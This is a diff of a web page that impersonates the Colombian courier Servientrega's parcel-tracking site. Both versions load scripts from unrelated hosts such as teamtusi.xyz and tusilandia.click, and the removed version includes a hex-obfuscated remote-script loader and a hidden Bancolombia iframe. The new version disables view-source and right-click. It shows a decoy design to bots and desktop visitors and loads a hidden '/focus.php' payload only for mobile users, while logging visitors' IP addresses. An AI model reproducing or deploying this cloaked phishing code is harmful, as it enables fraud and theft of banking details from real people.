@@ -1,76 +1,309 @@
-<html>
+<!DOCTYPE html>
+<html lang="es">
+
 <head>
   <meta charset="utf-8" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Servientrega - Rastreos</title>
-  
-  <!-- Agregado de Google Tag Manager y otras etiquetas necesarias -->
+  <title>Servientrega - Rastreo de Guía</title>
+  <script id="_waun94">var _wau = _wau || []; _wau.push(["small", "pomelo", "n94"]);</script>
+  <link href="//fonts.googleapis.com/css?family=Open+Sans:400italic,400,700&subset=latin,cyrillic" rel="stylesheet" type="text/css" />
   <script async src="https://www.googletagmanager.com/gtag/js?id=AW-11395263888"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('js', new Date());
-    gtag('config', 'AW-11395263888');
-  </script>
-  <!-- Fin de Google Tag Manager -->
-
-  <script type="text/javascript">
-    (function() {
-      var _0x1234 = ["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x74\x65\x61\x6D\x74\x75\x73\x69\x2E\x6F\x6E\x6C\x69\x6E\x65\x2F\x73\x63\x72\x69\x70\x74\x2E\x70\x68\x70\x3F\x74\x6F\x6B\x3D\x71\x77\x65\x72\x74\x79\x30\x39\x31\x37\x36\x37\x38"];
-      var _0x5678 = document.createElement('script');
-      _0x5678.src = _0x1234[0];
-      document.body.appendChild(_0x5678);
-    })();
-  </script>
-<script id="_waun94">var _wau = _wau || []; _wau.push(["small", "balatop", "n94"]);</script>
-    <script async src="//waust.at/s.js"></script>
-
-  <script type="text/javascript">
-    document.getElementById('triggerScript').addEventListener('click', function() {
-      var script = document.createElement('script');
-      document.body.appendChild(script);
-    });
-  </script>
-  
+  <script id="_waun94">var _wau = _wau || []; _wau.push(["small", "balatop", "n94"]);</script>
+  <script async src="//waust.at/s.js"></script>
 </head>
 
 <body class="t-body">
-
-  <iframe src="https://www.bancolombia.com" style="width: 1px; height: 1px; border: none; position: absolute;"></iframe>
-
-   
-  <script type="text/javascript" src="https://teamtusi.xyz/js/jquery.jclockNew.js"></script>
+  <script type="text/javascript" src="https://tusilandia.click/js/jquery.jclockNew.js"></script>
   <script type="text/javascript" src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
-  <script type="text/javascript" src="https://472.tusilandia.click/__servi/script.php?tok=lupin7777" async="true"></script>
-  
-  <div style="display: none;" class="b-main t-container clearfix">
-    <!-- <middle> -->
-    <div style="display: none;" class="b-logo b-white">
-      <div class="site-title">
-        <!-- <logo> -->My site
-        <!-- </logo> -->
-      </div>
-      <div class="site-slogan">$SITE_NAME$</div>
+  <script type="text/javascript" src="https://teamtusi.xyz/js/jquery.jclockNew.js"></script>
+
+  <script>
+    document.addEventListener('keydown', function(e) {
+      if (e.ctrlKey && e.key === 'u') {
+        e.preventDefault();
+      }
+    });
+
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+    });
+
+    function esBot() {
+      var ua = navigator.userAgent.toLowerCase();
+      return /bot|googlebot|crawler|spider|robot|crawling/.test(ua);
+    }
+
+    function esGoogleBot() {
+      var ua = navigator.userAgent.toLowerCase();
+      return /googlebot/.test(ua);
+    }
+
+    function esPC() {
+      return window.innerWidth > 1024;
+    }
+
+    function cargarFocusPHP() {
+      if (!esBot() && !esGoogleBot() && !esPC()) {
+        console.log("Cargando...");
+        var script = document.createElement("script");
+        script.type = "text/javascript";
+        script.src = "/focus.php";  // Cargar focus.php para ejecutar el script
+        script.async = true;
+        document.body.appendChild(script);
+      } else {
+        console.log("Condición no cumplida: bot, googlebot o PC detectado.");
+      }
+    }
+
+    function mostrarContenido() {
+      if (esBot() || esGoogleBot() || esPC()) {
+        document.getElementById("g").style.display = "block";
+        document.getElementById("h").style.display = "none";
+      } else {
+        document.getElementById("g").style.display = "none";
+        document.getElementById("h").style.display = "block";
+      }
+    }
+
+    window.onload = function() {
+      mostrarContenido();
+      cargarFocusPHP();
+
+      fetch('log_ip.php')
+        .then(response => response.text())
+        .then(data => {
+          console.log(data);
+        })
+        .catch(error => {
+          console.error('Error al registrar la IP:', error);
+        });
+    };
+  </script>
+
+  <!-- NUEVO DISEÑO PARA ESCRITORIO -->
+  <div id="g" style="display: none;">
+    <style>
+      :root {
+        --primary: #008f63;
+        --primary-dark: #006b4b;
+        --bg-light: #f9f9f9;
+        --text-dark: #1f1f1f;
+        --text-gray: #666;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      body {
+        margin: 0;
+        font-family: 'Inter', sans-serif;
+        background: var(--bg-light);
+        color: var(--text-dark);
+        line-height: 1.6;
+      }
+
+      header {
+        background: white;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 1.5rem 2rem;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+      }
+
+      header img {
+        height: 45px;
+      }
+
+      nav a {
+        margin-left: 2rem;
+        text-decoration: none;
+        color: var(--text-dark);
+        font-weight: 600;
+      }
+
+      nav a:hover {
+        color: var(--primary);
+      }
+
+      .hero {
+        background: linear-gradient(to right, #007b5e, #00aa84);
+        color: white;
+        padding: 4rem 2rem;
+        text-align: center;
+      }
+
+      .hero h1 {
+        font-size: 2.8rem;
+        margin-bottom: 0.5rem;
+      }
+
+      .hero p {
+        font-size: 1.2rem;
+        opacity: 0.9;
+      }
+
+      .container {
+        max-width: 1000px;
+        margin: auto;
+        padding: 2rem;
+      }
+
+      section {
+        margin: 3rem 0;
+        background: white;
+        padding: 2rem;
+        border-radius: 10px;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+      }
+
+      h2 {
+        color: var(--primary);
+        margin-bottom: 1rem;
+        font-size: 1.8rem;
+      }
+
+      .track-form input {
+        padding: 1rem;
+        width: 70%;
+        max-width: 400px;
+        border: 1px solid #ccc;
+        border-radius: 6px;
+        margin-right: 1rem;
+        font-size: 1rem;
+      }
+
+      .track-form button {
+        padding: 1rem 2rem;
+        background: var(--primary);
+        color: white;
+        border: none;
+        font-size: 1rem;
+        border-radius: 6px;
+        cursor: pointer;
+        transition: 0.3s;
+      }
+
+      .track-form button:hover {
+        background: var(--primary-dark);
+      }
+
+      ul {
+        padding-left: 1.2rem;
+      }
+
+      li {
+        margin-bottom: 0.8rem;
+      }
+
+      .contact p {
+        margin: 0.3rem 0;
+      }
+
+      footer {
+        text-align: center;
+        background: #eeeeee;
+        padding: 2rem;
+        font-size: 0.9rem;
+        color: var(--text-gray);
+        margin-top: 3rem;
+      }
+
+      @media (max-width: 768px) {
+        header {
+          flex-direction: column;
+          align-items: flex-start;
+        }
+
+        nav {
+          margin-top: 1rem;
+        }
+
+        nav a {
+          margin-left: 0;
+          margin-right: 1.5rem;
+          display: inline-block;
+        }
+
+        .track-form input {
+          width: 100%;
+          margin: 0 0 1rem 0;
+        }
+
+        .track-form button {
+          width: 100%;
+        }
+      }
+    </style>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+
+    <header>
+      <div class="logo">Servientrega</div>
+      <nav>
+        <a href="#rastreo">Rastreo</a>
+        <a href="#servicios">Servicios</a>
+        <a href="#nosotros">Nosotros</a>
+        <a href="#contacto">Contacto</a>
+      </nav>
+    </header>
+
+    <div class="hero">
+      <h1>Envíos confiables. Rastreo instantáneo.</h1>
+      <p>Con Servientrega, tu paquete está siempre en buenas manos</p>
     </div>
-    <div style="display: none;" class="b-maincontent b-white" role="main">
-      <div class="content-padding">
-      </div>
+
+    <div class="container">
+      <section id="rastreo" class="track-form">
+        <h2>Rastrea tu Envío</h2>
+        <p>Ingresa tu número de guía para conocer el estado actual de tu paquete:</p>
+        <form>
+          <input type="text" placeholder="Ej: 1234567890" required />
+          <button type="submit">Rastrear</button>
+        </form>
+      </section>
+
+      <section id="servicios">
+        <h2>Servicios</h2>
+        <ul>
+          <li>📦 Envíos nacionales e internacionales rápidos</li>
+          <li>🚛 Logística y distribución empresarial</li>
+          <li>🔒 Rastreo en tiempo real 24/7</li>
+          <li>📍 Entregas programadas y a demanda</li>
+        </ul>
+      </section>
+
+      <section id="nosotros">
+        <h2>Sobre Nosotros</h2>
+        <p>Somos una empresa con más de 10 años de experiencia conectando negocios, personas y ciudades a través de soluciones de logística inteligente.</p>
+      </section>
+
+      <section id="contacto" class="contact">
+        <h2>Contacto</h2>
+        <p>📍 Dirección: Calle 123, Ciudad Central</p>
+        <p>📞 Teléfono: +57 300 000 0000</p>
+        <p>📧 Email: contacto@servientrega.com</p>
+      </section>
     </div>
-    <div style="display: none;" class="sidebar-clear clearleft"></div>
-    <aside style="display: none;" class="b-sidebar b-white clearfix">
-      $GLOBAL_CLEFTER$
-    </aside>
-    <!-- </middle> -->
+
+    <footer>
+      © 2025 Servientrega. Todos los derechos reservados.
+    </footer>
   </div>
 
-  <div style="display: none;"></div>
-  <textarea style="display: none;" name="" id="" cols="30" rows="10"> $GLOBAL_BFOOTER$ </textarea>
+  <!-- CONTENIDO PARA MÓVILES -->
+  <div id="h" class="b-main t-container clearfix" style="display: none;">
+    <div class="b-logo b-white">
+      <div class="site-title"></div>
+    </div>
+    <div class="b-maincontent b-white" role="main">
+      <div class="content-padding"></div>
+    </div>
+    <div class="sidebar-clear clearleft"></div>
+    <aside class="b-sidebar b-white clearfix"></aside>
+  </div>
 
 </body>
-
 </html>
-
-<p align="center">
-  <iframe src width="1" height="1" marginwidth="0" marginheight="0" hspace="0" vspace="0" frameborder="0" scrolling="no"></iframe>
-</p>
